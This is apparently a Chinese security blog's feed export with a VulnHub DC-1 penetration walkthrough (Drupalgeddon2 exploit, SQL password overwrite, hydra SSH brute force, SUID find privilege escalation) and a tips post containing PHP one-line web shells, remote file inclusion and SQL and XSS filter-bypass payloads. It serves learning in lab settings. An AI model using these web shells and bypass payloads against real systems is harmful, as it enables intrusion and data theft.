href="https://zhuanlan.zhihu.com/p/512201236#:~:text=%5Broot%40localhost%20~%5D%23%20echo%20%24PATH%20%2Fusr%2Flocal%2Fsbin%3A%2Fusr%2Fsbin%3A%2Fsbin%3A%2Fusr%2Flocal%2Fbin%3A%2Fusr%2Fbin%3A%2Fbin%3A%2Froot%2Fbin%20%E8%BF%99%E9%87%8C%E7%9A%84%20echo,%E5%91%BD%E4%BB%A4%E7%94%A8%E6%9D%A5%E8%BE%93%E5%87%BA%20PATH%20%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E7%9A%84%E5%80%BC%EF%BC%88%E8%BF%99%E9%87%8C%E7%9A%84%20%24%20%E6%98%AF%20PATH%20%E7%9A%84%E5%89%8D%E7%BC%80%E7%AC%A6%E5%8F%B7%EF%BC%89%EF%BC%8CPATH%20%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E7%9A%84%E5%86%85%E5%AE%B9%E6%98%AF%E7%94%B1%E4%B8%80%E5%A0%86%E7%9B%AE%E5%BD%95%E7%BB%84%E6%88%90%E7%9A%84%EF%BC%8C%E5%90%84%E7%9B%AE%E5%BD%95%E4%B9%8B%E9%97%B4%E7%94%A8%E5%86%92%E5%8F%B7%E2%80%9C%3A%E2%80%9D%E9%9A%94%E5%BC%80%E3%80%82">Linux PATH环境变量及作用（初学者必读）</a></p><p>2.<a href="https://cloud.tencent.com/developer/article/1680551">RBash - 受限的Bash绕过</a></p><p>3.CSDN博主「小郭学安全」的<a href="https://blog.csdn.net/G_Fu_Q/article/details/116276096">原创文章</a></p><p>4.CSDN博主「a310034188」的<a href="https://blog.csdn.net/a310034188/article/details/121624538">原创文章</a></p><p>5.[入门靶机 DC-2的渗透测试](<a href="https://zhuanlan.zhihu.com/p/476546596">入门靶机 DC-2的渗透测试 - 知乎 (zhihu.com)</a>)</p><p>6.<a href="https://blog.csdn.net/weixin_54252904/article/details/115801069">Rbash绕过</a></p>]]></content>
    
    
    <categories>
      
      <category>vulnhub</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Linux环境变量</tag>
      
      <tag>Linux git提权</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>DC-1</title>
    <link href="/2023/08/15/DC-1/"/>
    <url>/2023/08/15/DC-1/</url>
    
    <content type="html"><![CDATA[<h1 id="DC系列简介原文"><a href="#DC系列简介原文" class="headerlink" title="DC系列简介原文"></a>DC系列简介原文</h1><p>DC 挑战是一系列故意易受攻击的实验室，目的是在渗透测试领域获得经验。</p><p>我开始创建这些易受攻击的虚拟机，以便初学者（像我这样的人）可以了解尝试（合法地）闯入系统所涉及的内容。</p><p>当我去年年底开始做这类挑战时，我发现很多更像是拼图。虽然它们很有趣，但我也有点失望，因为我想找到一些更多的挑战……现实。这并不是说它们不好或不具有挑战性，但我确实有点厌倦了一遍又一遍地看到同样的事情。</p><p>因此，考虑到这一点，您将不会看到：</p><ul><li>任何已进行 base64 编码的标志</li><li>任何脑残的编码标志</li><li>隐藏在图像中的任何“秘密”文本（隐写术）</li></ul><p>虽然 DC-1 和 DC-2 都有提示&#x2F;线索作为标志，但从 DC-3 开始，没有线索，只有一个可以通过 root 权限（直接或间接）获得的标志。</p><p>总共有 9 个 DC 版本，全部于 2019 年发布。</p><p>虽然DC系列在DC-9发布后正式结束，但我创建了一个名为Five86的新系列。</p><p>我希望你喜欢挑战，就像我喜欢创造它们一样。</p><p>感谢靶场作者</p><h1 id="DC-1靶场渗透"><a href="#DC-1靶场渗透" class="headerlink" title="DC-1靶场渗透"></a>DC-1靶场渗透</h1><h2 id="0x01-靶场简介原文"><a href="#0x01-靶场简介原文" class="headerlink" title="0x01 靶场简介原文"></a>0x01 靶场简介原文</h2><p>DC-1是一个专门建造的易受攻击的实验室，目的是在渗透测试领域获得经验。</p><p>它旨在对初学者来说是一个挑战，但它的难易程度取决于您的技能和知识以及您的学习能力。</p><p>要成功完成这一挑战，您需要 Linux 技能、熟悉 Linux 命令行以及基本渗透测试工具的经验，例如可以在 Kali Linux 或 Parrot Security OS 上找到的工具。</p><p>有多种方法可以扎根，但是，我包括了一些包含初学者线索的标志。</p><p>总共有五个标志，但最终目标是在 root 的主目录中查找并读取该标志。您甚至不需要是 root 用户即可执行此操作，但是，您将需要 root 权限。</p><p>根据您的技能水平，您也许可以跳过查找大多数这些标志并直接进入root。</p><p>初学者可能会遇到以前从未遇到过的挑战，但谷歌搜索应该是获得完成此挑战所需的信息所需的全部内容。</p><h2 id="0x02-环境搭建"><a href="#0x02-环境搭建" class="headerlink" title="0x02 环境搭建"></a>0x02 环境搭建</h2><p>本次环境为NAT下</p><p>攻击机为kali，IP：192.168.86.129</p><p>靶机<a href="https://download.vulnhub.com/dc/DC-1.zip">镜像下载</a></p><p>用vmware打开即可，会提示导入失败，点重试就行，打开到此界面就ok了</p><p><img src="1.png" alt="1"></p><p>目标：总共有五个flag，但最终目标是在 root 的主目录中查找并读取flag。您甚至不需要是 root 用户即可执行此操作，但是，您将需要 root 权限。</p><h2 id="0x03-信息收集"><a href="#0x03-信息收集" class="headerlink" title="0x03 信息收集"></a>0x03 信息收集</h2><h3 id="1-扫描192-168-86-0网段下存活主机"><a href="#1-扫描192-168-86-0网段下存活主机" class="headerlink" title="1.扫描192.168.86.0网段下存活主机"></a>1.扫描192.168.86.0网段下存活主机</h3><p>kali下使用<strong>arp-scan -l</strong>命令查看同网段下存活的主机</p><p><img src="2.png" alt="2"></p><p>这里也可以使用nmap</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">nmap</span> -sP <span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">86</span>.*<br><span class="hljs-attribute">nmap</span> -sP <span class="hljs-number">192.168.86.0</span>/<span class="hljs-number">24</span>   //这种方式可以指定掩码位数<br></code></pre></td></tr></table></figure><p>也可以使用<strong>netdiscover -i eth0</strong>命令，但是有点慢</p><p>.1是我的主机，.2是网关，254是DHCP服务器(ipconfig &#x2F;all查看VMnet8的)，那只能是192.168.86.164了，或者查看DC-1的mac地址，也能确定</p><h3 id="2-探测开放端口"><a href="#2-探测开放端口" class="headerlink" title="2.探测开放端口"></a>2.探测开放端口</h3><p>这里使用nmap</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">nmap</span> -sS <span class="hljs-number">192.168.86.164</span><br></code></pre></td></tr></table></figure><ul><li>-sS 半开扫描(TCP SYN扫描)，执行速度快，不容易被注意到，可以避免被记入目标系统的日志，需要root权限。它常常被称为半开放扫描， 因为它不打开一个完全的TCP连接。它发送一个SYN报文， 就像您真的要打开一个连接，然后等待响应。</li></ul><p><img src="3.png" alt="3"></p><p>可以看到，22和80是开放的，应该是突破口</p><h3 id="3-访问web页面"><a href="#3-访问web页面" class="headerlink" title="3.访问web页面"></a>3.访问web页面</h3><p><img src="4.png" alt="4"></p><p>通过插件可以看到，网站的cms是Drupal 7</p><p>这里可以用御剑扫一下目录，有robots.txt，index.php和install.php，用处不大</p><p>也可以用goby等等扫一下，这里goby给出了一个sq注入(CVE-2014-3704)</p><h2 id="0x04-渗透"><a href="#0x04-渗透" class="headerlink" title="0x04 渗透"></a>0x04 渗透</h2><h3 id="1-寻找切入点"><a href="#1-寻找切入点" class="headerlink" title="1.寻找切入点"></a>1.寻找切入点</h3><p>有cms肯定从cms下手，打开kali的msfconsole模块，寻找Drupal相关exp</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">search drupal</span><br></code></pre></td></tr></table></figure><p><img src="5.png" alt="5"></p><h3 id="2-漏洞利用"><a href="#2-漏洞利用" class="headerlink" title="2.漏洞利用"></a>2.漏洞利用</h3><p>选新且rank高的</p><figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs gauss"><span class="hljs-keyword">use</span> exploit/unix/webapp/drupal_drupalgeddon2      <span class="hljs-comment">//选exp</span><br><span class="hljs-keyword">show</span> options                                      <span class="hljs-comment">//查看选项</span><br></code></pre></td></tr></table></figure><p><img src="6.png" alt="6"></p><p>Current Setting是目前设置的情况</p><p>Required表示是否需要设置内容，yes为必须设置，no为非必须</p><p>就上面来说RHOSTS(Remote host远程主机，即靶机)需要设置</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gams"><span class="hljs-keyword">set</span> rhosts <span class="hljs-comment">192.168.86.164</span><br></code></pre></td></tr></table></figure><p>可以再检查一下设置成功没，然后开始漏洞利用，这里run和exploit是一样的</p><p><img src="7.png" alt="7"></p><p>直接拿shell吧，看一下权限，是www-data</p><p><img src="8.png" alt="8"></p><p>看佬们的笔记，都选择了用交互式shell，跟个风吧，kali上执行以下命令：</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada">python -c <span class="hljs-symbol">&#x27;import</span> pty; pty.spawn(<span class="hljs-string">&quot;/bin/bash&quot;</span>)&#x27;<br></code></pre></td></tr></table></figure><p>出现交互式shell：</p><p><img src="9.png" alt="9"></p><p>找找flag吧</p><p>先看一下当前路径pwd(Print Working Directory)，然后看看根目录，但是并没有flag，直接看当前目录下的文件，发现flag1.txt</p><p><img src="10.png" alt="10"></p><p>打开看看</p><p><img src="11.png" alt="11"></p><p><strong>每一个好的CMS都需要一个配置文件-你也是</strong><br>提示配置文件，网上找drupal配置文件位置</p><p>作为一个<del>高端</del>的<del>大黑客</del>，<del>我</del>是不可能一点一点进入路径的：</p><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs matlab"><span class="hljs-built_in">cat</span> `<span class="hljs-built_in">find</span> / -name settings.php`<br></code></pre></td></tr></table></figure><p><img src="12.png" alt="12"></p><p>蛮力和字典攻击不是获得访问的唯一方法(您将需要访问)。您可以使用这些凭据做什么？</p><p>还给了mysql的用户：dbuser和密码：R0ck3t</p><p>应该是要我们拿到数据库管理员的权限</p><h3 id="3-渗透数据库"><a href="#3-渗透数据库" class="headerlink" title="3.渗透数据库"></a>3.渗透数据库</h3><p>登录看看</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">mysql -u dbuser -<span class="hljs-selector-tag">p</span><br></code></pre></td></tr></table></figure><p><img src="13.png" alt="13"></p><p>drupal 框架默认的用户表就是 <strong>user</strong>表，所以在选定数据库后，直接查users表</p><p><img src="14.png" alt="14"></p><p>有admin的账户和密码</p><p>drupal 5、6都是用MD5加密的，但是自从 7.0之后，因为安全性的问题将加密方式改成了hash加密SHA-512(SHA2)，这里使用的应该是自定义的加密方式。</p><p>由于前面提示，暴破是不可行的。两个思路，要不再新建一个管理员账户，drupal7版本在有个SQL注入的漏洞，可以添加一个admin权限的用户，适用版本7.31以下，可以在msf找一下这个工具</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">searchsploit drupal</span><br></code></pre></td></tr></table></figure><p>找到Add Admin User的python脚本，然后查看一下脚本路径</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">searchsploit</span> <span class="hljs-number">34992</span>.py -p    <span class="hljs-comment">#searchsploit通过搜索关键词找到需要的漏洞，可以理解为一个离线的漏洞库</span><br></code></pre></td></tr></table></figure><p>可以通过访问url下载脚本使用</p><p>要不把现有的admin账户的密码改了，找到加密文件，**&#x2F;var&#x2F;www&#x2F;scripts&#x2F;password-hash.sh**，打开发现是php写的</p><p>注：linux中.sh文件是脚本文件,一般都是bash脚本。</p><p>执行命令，希望把密码改成wander，用脚本给出加密后的密码</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">php <span class="hljs-regexp">/var/</span>www<span class="hljs-regexp">/scripts/</span>password-hash.sh wander<br></code></pre></td></tr></table></figure><p><img src="15.png" alt="15"></p><p>看一下当前用户权限</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">show grants;<br></code></pre></td></tr></table></figure><p><img src="16.png" alt="16"></p><p>All&#x2F;All Privileges代表全局或者全数据库对象级别的所有权限，改两个账户的密码不在话下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">update users set pass=&quot;$S$DrPc841eKyKs6OiNj0UhxUAubyhahOtqVn9U4WGPhLF6Hoho8ms9&quot; where name=&quot;admin&quot; or name=&quot;Fred&quot;;<br></code></pre></td></tr></table></figure><p><img src="17.png" alt="16"></p><p>密码全改了，去web端登陆一下</p><p><img src="18.png" alt="17"></p><p>在content界面找到了flag3，perms是指权限相关的东西，-exec是<code>find</code>命令的一个选项。flag3提示要看&#x2F;etc&#x2F;shadow文件，但只有root才能查看，并且还是加密后的密文，提权看也不一定能看出来密码，所以换个思路</p><p>我们渗透测试获取shell之后，这三个文件必看：&#x2F;etc&#x2F;passwd, &#x2F;etc&#x2F;group和&#x2F;etc&#x2F;shadow</p><p>果然有所收获，在&#x2F;etc&#x2F;passwd中找到了flag4这个用户</p><p><img src="19.png" alt="19"></p><p>去flag4用户的目录下看看，发现有flag4.txt，打开看看</p><p><img src="20.png" alt="20"></p><p><strong>Can you use this same method to find or access the flag in root?</strong></p><p><strong>Probably. But perhaps it’s not that easy.  Or maybe it is?</strong></p><p>“你能用同样的方法找到或接触到root下的flag吗”</p><p>“可能吧，但也许这并不容易。谁知道呢”</p><p>不管了，先<del>梭哈</del></p><p>用hydra暴破一下flag4的用户</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">hydra</span> <span class="hljs-number">192.168.86.164</span> ssh -l flag4 -P ./top1000.txt -V -f<br></code></pre></td></tr></table></figure><p><img src="21.png" alt="21"></p><table><thead><tr><th align="left">参数</th><th>说明</th></tr></thead><tbody><tr><td align="left">l</td><td>指定登陆用户名</td></tr><tr><td align="left">L</td><td>用户名字典</td></tr><tr><td align="left">p</td><td>指定密码</td></tr><tr><td align="left">P</td><td>密码字典</td></tr><tr><td align="left">V</td><td>显示每一组user&#x2F;password情况</td></tr><tr><td align="left">f</td><td>暴破成功停止暴破</td></tr></tbody></table><p>拿到密码orange，刚好22端口开放，可以</p><figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs gherkin">ssh <span class="hljs-variable">&lt;username&gt;</span><span class="hljs-meta">@&lt;服务器ip&gt;</span>  <span class="hljs-comment">#此时默认22端口</span><br>ssh -p <span class="hljs-variable">&lt;端口号&gt;</span> <span class="hljs-variable">&lt;username&gt;</span><span class="hljs-meta">@&lt;服务器ip&gt;</span>   <span class="hljs-comment">#指定端口参数p</span><br></code></pre></td></tr></table></figure><p>比如<code>ssh flag4@192.168.86.164</code></p><p><strong>但如果你使用hydra，指定端口的参数是-s</strong></p><p>这里就不演示了，该拿flag5了</p><h3 id="4-Linux-find提权"><a href="#4-Linux-find提权" class="headerlink" title="4.Linux find提权"></a>4.Linux find提权</h3><h4 id="Why-find"><a href="#Why-find" class="headerlink" title="Why find"></a>Why find</h4><p>查看具有root用户权限的SUID文件</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-built_in">find</span> / -perm <span class="hljs-attribute">-u</span>=s -type f 2&gt;/dev/<span class="hljs-literal">null</span><br></code></pre></td></tr></table></figure><p>发现<code>/usr/bin/find</code>，就用find吧</p><h4 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h4><h5 id="Linux文件普通权限"><a href="#Linux文件普通权限" class="headerlink" title="Linux文件普通权限"></a>Linux文件普通权限</h5><p>r(read)读，数字表示：4</p><p>w(write)写，数字表示：2</p><p>x(execute)执行，数字表示：1</p><h5 id="Linux文件特殊权限"><a href="#Linux文件特殊权限" class="headerlink" title="Linux文件特殊权限"></a>Linux文件特殊权限</h5><p>linux文件的三种特殊权限分别是：suid权限、sgid权限、sticky权限；其中suid权限作用于文件属主，sgid权限作用于属组上，sticky权限作用于other其他上。</p><p><strong>suid</strong>：作用：让普通用户临时拥有该文件的属主的执行权限，suid权限只能应用在二进制可执行文件（命令）上，而且suid权限只能设置在属主位置上。</p><p>suid权限使用s表示，增加权限u+s，移除权限u-s；<br>suid权限也可以使用数字形式表示，0表示去除suid权限，4表示添加suid权限，而且是在原权限的数字表达形式开头加0或4，如：0755移除suid权限，4755添加suid权限。</p><p>例如：普通用户执行执行passwd命令时需要去修改&#x2F;etc&#x2F;shaow等文件，但ll &#x2F;etc&#x2F;shaow发现该文件没有任何权限，即普通用户对&#x2F;etc&#x2F;shaow文件是没有写入权限的，所以普通用户是怎么实现成功修改自己的密码的呢？答案是临时拥有了root权限（root超级管理员可以对任何文件进行修改）来实现密码的修改，suid权限只能应用在二进制可执行文件上。</p><p><strong>添加和去除suid权限</strong>：</p><p>suid权限的去除可以使用数字或字母的形式添加，如果使用数字，0表示去除权限，4表示添加权限，而且是在原权限的数字表达形式开头加0或4，字母形式下，suid权限使用s表示，增加权限u+s，移除权限u-s；</p><p><img src="22.png" alt="1"></p><p>现在成功赋予find命令suid，可以进行提权了</p><p><img src="23.png" alt="2"></p><p><del>翻车了</del></p><p>这里的坑就在于，利用find的exec执行命令，执行是以root的权限执行，之后却是低权限。原因在其id上可以发现。</p><p>划重点：<strong>默认情况下 bash 在执行时，如果发现 euid(effective有效uid) 和 uid 不配，会将 euid (即 suid) 强制重置为uid</strong></p><p>因此需要用到参数： -p</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ·">find passwd -exec &quot;/bin/(ba)sh&quot; -p \;<br></code></pre></td></tr></table></figure><p><img src="6.png" alt="24"></p><p>可以看到，象征root的<code>#</code>已经显示出来了，且此时euid为root</p><p>此时反弹的shell就是root权限了</p><p>好，那么好，演出开始</p><p><img src="25.png" alt="25"></p><p>非法参数p，ok；</p><p>bash不让用，无所谓</p><p>#必须出来！！！</p><p><img src="26.png" alt="26"></p><p><strong>congratulation！！！</strong></p><h2 id="0x04-致谢"><a href="#0x04-致谢" class="headerlink" title="0x04 致谢"></a>0x04 致谢</h2><p>1.CSDN博主「MssGuo」的<a href="https://blog.csdn.net/MssGuo/article/details/120754324">原创文章</a></p><p>2.今天也要学安全的<a href="https://www.zhihu.com/people/yan-huo-li-de-chen-ai-20/posts?page=3">原创文章</a></p><p>3.CSDN博主金 帛的<a href="https://blog.csdn.net/l2872253606/article/details/125463013">原创文章</a></p><p>4.CSDN博主0x010的<a href="https://blog.csdn.net/rlenew/article/details/111873682">原创文章</a></p>]]></content>
    
    
    <categories>
      
      <category>vulnhub</category>
      
    </categories>
    
    
    <tags>
      
      <tag>find提权</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Tips</title>
    <link href="/2023/05/18/Tips/"/>
    <url>/2023/05/18/Tips/</url>
    
    <content type="html"><![CDATA[<h3 id="远程文件包含"><a href="#远程文件包含" class="headerlink" title="远程文件包含"></a>远程文件包含</h3><p>在进行文件包含时，不一定非要包含目标主机的文件，也可以包含自己电脑上的文件，举个例子：</p><p>先在本地创建一个网站，名字随便，这里起名test.com，端口81，文件包含的文件名是1.php，内容是：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">include</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>]);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>本地被包含的文件名为1.txt，内容是：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">phpinfo</span>();<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>然后看一下自己的ip，这里是192.168.120.1</p><p><strong>划重点，这里我的ip是vmnet1（仅主机）下的ip，如果想复现的话别搞错ip</strong></p><p>包含的url：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">120.132</span><span class="hljs-regexp">/1.php?file=http:/</span><span class="hljs-regexp">/192.168.120.1:81/</span><span class="hljs-number">1</span>.txt<br></code></pre></td></tr></table></figure><p>依然能看到服务器的phpinfo()信息。</p><hr><h3 id="sql一些特性"><a href="#sql一些特性" class="headerlink" title="sql一些特性"></a>sql一些特性</h3><h4 id="1-exp-函数"><a href="#1-exp-函数" class="headerlink" title="1.exp()函数"></a>1.exp()函数</h4><p>exp(x)函数是计算自然常数e的x次方的函数，exp(709)合法而exp(710)非法，因此，在进行盲注时，若if()被过滤，可转而使用exp()，如：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">select</span> if(ascii(&#x27;d&#x27;)=<span class="hljs-number">100</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>);<br></code></pre></td></tr></table></figure><p>等价于：</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">select</span> exp(<span class="hljs-number">710</span>-ascii(<span class="hljs-string">&#x27;d&#x27;</span>)=<span class="hljs-number">100</span>);<br></code></pre></td></tr></table></figure><p>返回值都是1(true)</p><h4 id="2-and-1-x3D-1"><a href="#2-and-1-x3D-1" class="headerlink" title="2.and 1&#x3D;1"></a>2.and 1&#x3D;1</h4><p>如果不行，and 1也是一样的</p><h4 id="3-ord"><a href="#3-ord" class="headerlink" title="3.ord()"></a>3.ord()</h4><p>ord(str)函数用于查找字符串中最左侧字符，若最左侧字符为单字节字符，ord()函数返回该字符的ascii值，根据此特性，ord()函数可以用来代替ascii()函数</p><h4 id="4-x2F-x2F"><a href="#4-x2F-x2F" class="headerlink" title="4. &#x2F;**&#x2F;"></a>4. &#x2F;**&#x2F;</h4><p>当database()被拦，可以尝试database&#x2F;**&#x2F;()效果一样</p><p>database(&#x2F;**&#x2F;)也可以正常执行，当然，上述两种方法可以组合。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">database/*!(*/)     //这也是可以的<br></code></pre></td></tr></table></figure><p>由此，version()也行</p><h4 id="5-current-user"><a href="#5-current-user" class="headerlink" title="5.current_user"></a>5.current_user</h4><p>在挖src时，拿到当前用户大概率会被收</p><hr><h3 id="js一些特性"><a href="#js一些特性" class="headerlink" title="js一些特性"></a>js一些特性</h3><p>1.js有特殊字符转义字符，当空格被过滤，可以使用Unicode绕过，附对照表</p><table><thead><tr><th>Unicode 字符值</th><th>转义序列</th><th>含义</th><th>类别</th></tr></thead><tbody><tr><td>\u0008</td><td>\b</td><td>Backspace</td><td></td></tr><tr><td>\u0009</td><td>\t</td><td>Tab</td><td>空白</td></tr><tr><td>\u000A</td><td>\n</td><td>换行符（换行）</td><td>行结束符</td></tr><tr><td>\u000B</td><td>\v</td><td>垂直制表符</td><td>空白</td></tr><tr><td>\u000C</td><td>\f</td><td>换页</td><td>空白</td></tr><tr><td>\u000D</td><td>\r</td><td>回车</td><td>行结束符</td></tr><tr><td>\u0020</td><td></td><td>空格</td><td>空白</td></tr><tr><td>\u0022</td><td>&quot;</td><td>双引号 (“)</td><td></td></tr><tr><td>\u0027</td><td>&#39;</td><td>单引号 (‘)</td><td></td></tr><tr><td>\u005C</td><td>\</td><td>反斜杠 ()</td><td></td></tr><tr><td>\u00A0</td><td></td><td>不间断空格</td><td>空白</td></tr><tr><td>\u2028</td><td></td><td>行分隔符</td><td>行结束符</td></tr><tr><td>\u2029</td><td></td><td>段落分隔符</td><td>行结束符</td></tr><tr><td>\uFEFF</td><td></td><td>字节顺序标记</td><td>空白</td></tr></tbody></table><p>如：</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scss">select\<span class="hljs-built_in">u000Bdatabase</span>();<br></code></pre></td></tr></table></figure><hr><h3 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h3><h4 id="1-当-lt-被拦，可以采用如下形式："><a href="#1-当-lt-被拦，可以采用如下形式：" class="headerlink" title="1.当&lt;?被拦，可以采用如下形式："></a>1.当&lt;?被拦，可以采用如下形式：</h4><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">language</span>=<span class="hljs-string">&quot;php&quot;</span>&gt;</span><span class="language-javascript">@<span class="hljs-built_in">eval</span>($_POST[<span class="hljs-string">&#x27;cmd&#x27;</span>]);</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><h4 id="2-变量传递"><a href="#2-变量传递" class="headerlink" title="2.变量传递"></a>2.变量传递</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$a</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;x&#x27;</span>];<br><span class="hljs-variable">$$a</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;y&#x27;</span>];<br><span class="hljs-variable">$b</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;z&#x27;</span>]);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>传入方法：<a href="http://xx.php/?x=b&y=assert">http://xx.php?x=b&amp;y=assert</a></p><p>post:z&#x3D;phpinfo();</p><p>对数据传输进行加密：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">assert</span>(<span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;x&#x27;</span>]));<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><hr><h3 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h3><p><code>echo &quot;admin&quot;&gt;1.txt</code>：将admin写入1.txt，如果1.txt不存在会自动创建并写入</p><p>​   如果1.txt存在，admin将覆盖1.txt中的内容</p><p><code>echo &quot;admin&quot;&gt;&gt;1.txt</code>：同样，将admin写入1.txt，如果1.txt不存在会自动创建并写入</p><p>​     如果1.txt存在，将在1.txt中已有内容的基础上，换行写入admin</p><hr><h3 id="Easter-Eggs"><a href="#Easter-Eggs" class="headerlink" title="Easter Eggs"></a>Easter Eggs</h3><p>复活节彩蛋：php.ini里的expose_php设为On时，在网站url后加上以下字符串，会获取一些信息</p><figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs subunit">?=PHPB8B5F2A0<span class="hljs-string">-3</span>C92<span class="hljs-string">-11</span>d3-A3A9<span class="hljs-string">-4</span>C7B08C10000 (PHP信息列表)<br>?=PHPE9568F34-D428<span class="hljs-string">-11</span>d2-A769<span class="hljs-string">-00</span>AA001ACF42 (PHP的LOGO)<br>?=PHPE9568F35-D428<span class="hljs-string">-11</span>d2-A769<span class="hljs-string">-00</span>AA001ACF42 (Zend LOGO)<br>?=PHPE9568F36-D428<span class="hljs-string">-11</span>d2-A769<span class="hljs-string">-00</span>AA001ACF42 (PHP LOGO 蓝色大象)<br></code></pre></td></tr></table></figure><hr><h3 id="jother编码"><a href="#jother编码" class="headerlink" title="jother编码"></a>jother编码</h3><p>首先给出一个非官方的jother编码定义：jother是一种运用于javascript语言中利用少量字符构造精简的匿名函数方法对于字符串进行的编码方式。其中少量字符包括：”!”、”+”、”(“、”)”、”[“、”]”、”{“、”}”。只用这些字符就能完成对任意字符串的编码</p><p>可以拿来绕过xss</p><p><a href="https://wooyun.js.org/drops/jother%E7%BC%96%E7%A0%81%E4%B9%8B%E8%B0%9C.html">参考文章</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>远程文件包含</tag>
      
      <tag>sql绕过</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>bugkuweb</title>
    <link href="/2023/05/05/bugkuweb/"/>
    <url>/2023/05/05/bugkuweb/</url>
    
